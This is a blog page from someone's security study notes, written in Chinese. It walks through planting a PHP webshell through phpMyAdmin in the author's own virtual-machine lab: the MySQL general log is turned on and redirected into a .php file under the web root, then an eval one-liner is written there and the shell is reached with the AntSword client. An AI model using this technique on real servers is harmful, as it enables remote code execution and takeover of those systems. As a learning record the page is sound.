@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>第11天学习笔记 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="根据phpmyadmin更改日志写入webshell1.下载phpmyadmin打开win10虚拟机中的小皮面板-&gt;开启Apache和MySQL-&gt;点击软件管理-&gt;找到phpmyadmin进行下载-&gt;下载完成后点击管理，选择站点（可使用之前搭好的WWW）-&gt;打开phpmyadmin 2.LIKE &#39;%secure%&#39;子句来过滤出那些包含”secure”">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第11天学习笔记">
+<meta property="og:url" content="http://example.com/2023/11/22/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-11/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="根据phpmyadmin更改日志写入webshell1.下载phpmyadmin打开win10虚拟机中的小皮面板-&gt;开启Apache和MySQL-&gt;点击软件管理-&gt;找到phpmyadmin进行下载-&gt;下载完成后点击管理，选择站点（可使用之前搭好的WWW）-&gt;打开phpmyadmin 2.LIKE &#39;%secure%&#39;子句来过滤出那些包含”secure”">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122205235659.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimg1ad00a6cfdea41f7b7b70f17f4e12a8f.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122225814982.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122230139593.png">
+<meta property="article:published_time" content="2023-11-22T09:30:22.000Z">
+<meta property="article:modified_time" content="2023-11-22T15:02:47.270Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122205235659.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/3.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/highlight.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" style="background-image: url(/images/13.jpg)" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-我的博客-11" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      第11天学习笔记
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2023/11/22/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-11/" class="article-date">
+  <time datetime="2023-11-22T09:30:22.000Z" itemprop="datePublished">2023-11-22</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <h2 id="根据phpmyadmin更改日志写入webshell"><a href="#根据phpmyadmin更改日志写入webshell" class="headerlink" title="根据phpmyadmin更改日志写入webshell"></a>根据phpmyadmin更改日志写入webshell</h2><h3 id="1-下载phpmyadmin"><a href="#1-下载phpmyadmin" class="headerlink" title="1.下载phpmyadmin"></a>1.下载phpmyadmin</h3><p>打开win10虚拟机中的小皮面板-&gt;开启Apache和MySQL-&gt;点击软件管理-&gt;找到phpmyadmin进行下载-&gt;下载完成后点击管理，选择站点（可使用之前搭好的WWW）-&gt;打开phpmyadmin</p>
+<h3 id="2-LIKE-secure-子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。"><a href="#2-LIKE-secure-子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。" class="headerlink" title="2.LIKE &#39;%secure%&#39;子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。"></a>2.<code>LIKE &#39;%secure%&#39;</code>子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-查看是否开启全局日志"><a href="#3-查看是否开启全局日志" class="headerlink" title="3.查看是否开启全局日志"></a>3.查看是否开启全局日志</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>若显示如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122205235659.png" alt="image-20231122205235659"></p>
+<p>则未开启全局日志，使用如下命令开启</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> set global general_log=ON</span><br></pre></td></tr></table></figure></div>
+
+<p>再次查看，若OFF更改为ON，则表示已开启。</p>
+<h3 id="4-更改日志路径"><a href="#4-更改日志路径" class="headerlink" title="4.更改日志路径"></a>4.更改日志路径</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> set global general_log_file=&quot;C:/phpstudy_pro/WWW/1.php&quot; //手动指定路径</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="5-测试"><a href="#5-测试" class="headerlink" title="5.测试"></a>5.测试</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>点击go运行后，在浏览器中输入地址（如：192.168.253.134&#x2F;1.php)</p>
+<p>若显示如下则测试成功（可能界面上方会有日志文件记录）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimg1ad00a6cfdea41f7b7b70f17f4e12a8f.png" alt="在这里插入图片描述"></p>
+<h3 id="6-蚁剑连接一句话木马"><a href="#6-蚁剑连接一句话木马" class="headerlink" title="6.蚁剑连接一句话木马"></a>6.蚁剑连接一句话木马</h3><p>安装完蚁剑后。</p>
+<p>在phpmyadmin中实行SQL语句</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>进入蚁剑，右键点击添加数据：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122225814982.png" alt="image-20231122225814982"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122230139593.png" alt="image-20231122230139593"></p>
+<p>填写完URL地址和密码后点击测试连接，弹出成功窗口即测试成功。</p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2023/11/21/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-10/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">第10天学习笔记</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/3.png" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        volcano
+      
+    </h3>
+    <p class="avatar-slogan">
+      长风破浪会有时 直挂云帆济沧海
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/22/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-11/">第11天学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/21/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-10/">第10天学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/20/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-9/">第9天学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/17/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-8/">第8天学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/16/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-7/">第7天学习笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="https://yiluyanxia.github.io/" title target='_blank'
+        >一路眼瞎</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2023 John Doe &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a target="_blank" rel="noopener" href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
